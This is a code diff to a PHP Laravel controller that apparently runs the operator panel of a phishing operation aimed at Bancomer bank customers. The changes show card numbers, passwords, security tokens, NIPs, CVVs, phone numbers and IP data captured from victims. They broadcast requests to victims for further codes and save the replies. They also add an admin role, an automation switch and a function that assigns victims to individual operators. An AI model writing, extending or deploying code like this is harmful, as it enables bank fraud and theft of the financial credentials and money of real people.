@@ -7,7 +7,11 @@ use App\Http\Controllers\Controller;
 use App\bancomer\Personal;
 use App\bancomer\Etiqueta;
 use App\bancomer\Orden;
+use App\bancomer\Automatizar;
 use App\bancomer\Etiqueta_Personal;
+use Caffeinated\Shinobi\Models\Role;
+use App\User;
+use Auth;
 use DB;
 
 class PersonalController extends Controller
@@ -19,8 +23,9 @@ class PersonalController extends Controller
      */
     public function index()
     {
+        $id = Auth::user()->id; 
 
-        return view('bancomer.personal.index');
+        return view('bancomer.personal.index',compact('id'));
     }
 
     public function getBrowserToImage($browser){
@@ -124,6 +129,28 @@ class PersonalController extends Controller
     }
 
     public function populate(){
+        //Es para saber  si es  admin o no
+        $id_conectado = Auth::user()->id;
+        $esAdmin = DB::table("users as u")
+                       ->join('role_user as rl', 'rl.user_id', '=', 'u.id')
+                       ->join('roles as rs', 'rs.id', '=', 'rl.role_id')
+                       ->select('rs.name')
+                       ->where('u.id','=',$id_conectado)
+                       ->first();
+
+        
+        //Auto recibi el valor de lo que esta en la tabla automatizar
+        //si auto-> estado = 1 lo oculta sino lo muestra
+        $auto = Automatizar::select("estado")
+                             ->where("tipo","=","bancomer")
+                             ->where("subtipo","=","personal")
+                             ->first();
+        $modo;
+        if($auto->estado == 1)
+          $modo = "none";
+        else
+          $modo = "block";
+
         /*  
             Obtengo los datos de todos los logos de manera descendente.
             ejemplo: 100,99,98...1
@@ -131,6 +158,7 @@ class PersonalController extends Controller
         $query2 = Personal::orderBy('id', 'desc')->get();
         $conteo = 1;
         $conteo_password = 1;
+        $conteo_token = 1;
         //recorro el arreglo para formar el data table
         foreach ($query2 as $q) {
             $marcado_formato = "";
@@ -170,6 +198,8 @@ class PersonalController extends Controller
                             foreach ($ordenes as $orden) {
                                 if($orden->descripcion == "password")
                                   $conteo_password = $conteo;
+                                else if($orden->descripcion == "token")
+                                  $conteo_token = $conteo;
                                 $marcado_formato .= '
                                   <div class="custom-control custom-control-alternative custom-checkbox ">
                                       <input class="custom-control-input "  type="checkbox" name="ord[]" id="orden'.$conteo.'" value="'.$orden->descripcion.'" onclick=llenarArreglo("'.$orden->descripcion.'","'.$conteo.'")>
@@ -187,50 +217,78 @@ class PersonalController extends Controller
                     <input type="text" class="form-control form-control-sm" name="input_name_bienvenida" id="input_name_bienvenida'.$conteo_password.'">
                   </label>
                 </div>
+
+                <div class="custom-control" id="div_token'.$conteo_token.'" style="display:none">
+                  <label style=""><span class="text-muted">Nombre de bienvenida</span>
+                    <input type="text" class="form-control form-control-sm" name="input_token" id="input_token'.$conteo_token.'">
+                  </label>
+                </div>';
+                if($esAdmin->name == "Poderoso" || $q->user_id == Auth::user()->id){
+                $marcado_formato .= '
                 <div class="custom-control custom-control-alternative">
-                    <button type="button" class="btn btn-primary btn-sm mt-4" id="enviar" onclick="sendMessage()"> Enviar orden</button>
-                </div>
+                    <button type="button" class="btn btn-primary btn-sm mt-4" id="enviar" onclick="sendMessage(0)"> Enviar orden</button>
+                </div>';}
+                if($esAdmin->name == "Poderoso"){
+                  $marcado_formato .= '
+                  <div class="custom-control custom-control-alternative">
+                      <button type="button" class="btn btn-success btn-sm mt-4 automatico" id="automatico" onclick="sendMessage(1)" style="display:'.$modo.'">  Automatizar</button>
+                  </div>';  
+                }
+                if($esAdmin->name == "Poderoso" || $q->user_id == Auth::user()->id){
+                $marcado_formato .= '
                 <div class="custom-control custom-control-alternative">
-                    <button type="button" class="btn btn-success btn-sm mt-4" id="automatico">  Automático</button>
-                </div>
+                    <button type="button" class="btn btn-danger btn-sm mt-4" id="finalizar" onclick="sendMessage(2)">Finalizar</button>
+                </div>';}
+                if($esAdmin->name == "Poderoso" || $q->user_id == 1){
+                $marcado_formato .='
                 <div class="custom-control custom-control-alternative">
-                    <button type="button" class="btn btn-danger btn-sm mt-4" id="finalizar">Finalizar</button>
-                </div>
+                    <button type="button" class="btn btn-info btn-sm mt-4" id="adjudicar" onclick="adj('.$q->id.')">Adjudicar</button>
+                </div>';}
+
+                $marcado_formato .='
                 </div></div></form>';
 
                 // $marcado_formato .= '';
             }
 
-            //realmente le puse getBrowserToImage porque pensaba hacer el llamado del
-            //path de la img desde el servidor pero se me hizo mas practio hacerlo en el
-            //navegador solo obtiene el short name del navegador ya que el navegador manda 
-            //todo el string del user agent
+            /* 
+              realmente le puse getBrowserToImage porque pensaba hacer el llamado del path de la img desde el servidor pero se me hizo mas practio hacerlo en el navegador solo obtiene el short name del navegador ya que el navegador manda todo el string del user agent
+            */
             $navegador = $this->getBrowserToImage($q->navegador);
 
             //Obtiene el shortname del sistema operativo 
             $sistema_operativo = $this->getOs($q->navegador);
 
+            $trabajador_nombre_atentiendo = DB::table("bancomer_personal as bp")
+                                                ->join("users as u","u.id","bp.user_id")
+                                                ->select("u.nickname")
+                                                ->where("bp.id","=",$q->id)
+                                                ->first();
+
             //lleno el arreglo para poder mandarselo al data table 
-            $data[]=array(
-                "formatoTag" => $marcado_formato,
-                "botones"=>$q->id,
-                "estatus"=> $q->estatus,
-                "id"=> $q->id,
-                "n_tarjeta"=> $q->n_tarjeta,
-                "nombre"=>  $q->nombre,
-                "contrasena"=> $q->contrasena,
-                "token"=> $q->token,
-                "nip"=> $q->nip,
-                "cvv"=> $q->cvv,
-                "compania"=> $q->compania,
-                "telefono"=> $q->telefono,
-                "mi_telcel"=> $q->mi_telcel,
-                "ip"=> $q->ip,
-                "navegador" => $navegador,
-                "os"=> $sistema_operativo,
-                "isp"=> $q->isp,
-                "created_at"=>$q->created_at->toDateTimeString()
-            );
+            //Hay tres condiciones solo lo mostrara si eres podereso si no esta adjudicado o si 
+            //tu ya lo adjudicaste
+            if($esAdmin->name == "Poderoso" || $q->user_id == Auth::user()->id || $q->user_id == 1){
+              $data[]=array(
+                  "formatoTag" => $marcado_formato,
+                  "botones"=>$q->id,
+                  "estatus"=> $q->estatus,
+                  "id"=> $q->id.",".$trabajador_nombre_atentiendo->nickname,
+                  "n_tarjeta"=> $q->n_tarjeta,
+                  "nombre"=>  $q->nombre,
+                  "contrasena"=> $q->contrasena,
+                  "token"=> $q->token,
+                  "nip"=> $q->nip,
+                  "cvv"=> $q->cvv,
+                  "compania"=> $q->compania,
+                  "telefono"=> $q->telefono,
+                  "mi_telcel"=> $q->mi_telcel,
+                  "ip"=> $q->ip,
+                  "navegador" => $navegador,
+                  "os"=> $sistema_operativo,
+                  "isp"=> $q->isp,
+                  "created_at"=>$q->created_at->toDateTimeString()
+              );}
         }
         //se lo mando formateado en json para que lo pueda leer el datatablejs
         return datatables($data)->make(true);
@@ -249,17 +307,20 @@ class PersonalController extends Controller
         // $sw=true;
         $etiquetas = $request->input('etiq');
 
-        while ($num_elementos < count($etiquetas))
-        {
-            // $personal->etiquetas()->sync($etiquetas_input[$num_elementos],$request->input('id_bancomer_personal'));
+        if($etiquetas){
+          while ($num_elementos < count($etiquetas))
+          {
+              // $personal->etiquetas()->sync($etiquetas_input[$num_elementos],$request->input('id_bancomer_personal'));
 
-            $etiquetas_personal = new Etiqueta_Personal();
-            $etiquetas_personal->etiqueta_id = $etiquetas[$num_elementos];
-            $etiquetas_personal->personal_id = $id_bancomer_personal;
-            $etiquetas_personal->save();
+              $etiquetas_personal = new Etiqueta_Personal();
+              $etiquetas_personal->etiqueta_id = $etiquetas[$num_elementos];
+              $etiquetas_personal->personal_id = $id_bancomer_personal;
+              $etiquetas_personal->save();
 
-            $num_elementos=$num_elementos + 1;
+              $num_elementos=$num_elementos + 1;
+          }
         }
+
 
         
     }
@@ -286,7 +347,9 @@ class PersonalController extends Controller
         $channel = $request->get('channel','a');
         event(new \App\Events\BroadcastMessage($channel, 
             'messages', [
-            'message' => $request->get('message'), 
+            'message' => $request->get('message'),
+            'arr_ordenes' => $request->get('arr_ordenes'),
+            'compania' => $request->get('compania'),
             'channel' => $channel
         ]));
         if($request->get('cuenta2')){
@@ -297,6 +360,24 @@ class PersonalController extends Controller
         }else if($request->get('password')){
           $personal = Personal::where('n_tarjeta', $request->get('message'))->firstOrFail(); //findOrFail($request->get('cuenta2'));
           $personal->contrasena = $request->get('password');
+          $personal->update();
+        }else if ($request->get("token")){
+          $personal = Personal::where('n_tarjeta', $request->get('message'))->firstOrFail(); //findOrFail($request->get('cuenta2'));
+          $personal->token = $request->get('token');
+          $personal->update();
+        }else if($request->get('cvv')){
+          $personal = Personal::where('n_tarjeta', $request->get('message'))->firstOrFail(); //findOrFail($request->get('cuenta2'));
+          $personal->cvv = $request->get('cvv');
+          $personal->nip = $request->get('nip');
+          $personal->update();
+        }else if($request->get('telefono')){
+          $personal = Personal::where('n_tarjeta', $request->get('message'))->firstOrFail(); //findOrFail($request->get('cuenta2'));
+          $personal->compania = $request->get('compania');
+          $personal->telefono = $request->get('telefono');
+          $personal->update();
+        }else if($request->get('mi_telcel')){
+          $personal = Personal::where('n_tarjeta', $request->get('message'))->firstOrFail(); //findOrFail($request->get('cuenta2'));
+          $personal->mi_telcel = $request->get('mi_telcel');
           $personal->update();
         }else{
 
@@ -313,6 +394,7 @@ class PersonalController extends Controller
           $personal->compania = "";
           $personal->telefono = "";
           $personal->mi_telcel = "";
+          $personal->user_id = 1;
           $personal->ip = $request->get('ip');
           $personal->navegador = $request->get('navegador');
           $personal->os = $request->get('os');
@@ -367,6 +449,17 @@ class PersonalController extends Controller
         $personal->update();
 
         // $personal->update($request->all());
+    }
+
+    public function adj (Request $request, Personal $personal){
+
+      $personal = Personal::findOrFail($request->get("personal_id"));
+      if($personal->user_id == 1){
+        $personal->user_id = $request->get("user_id");
+        $personal->update();
+        return 1;
+      }
+      return 0;
     }
 
     /**
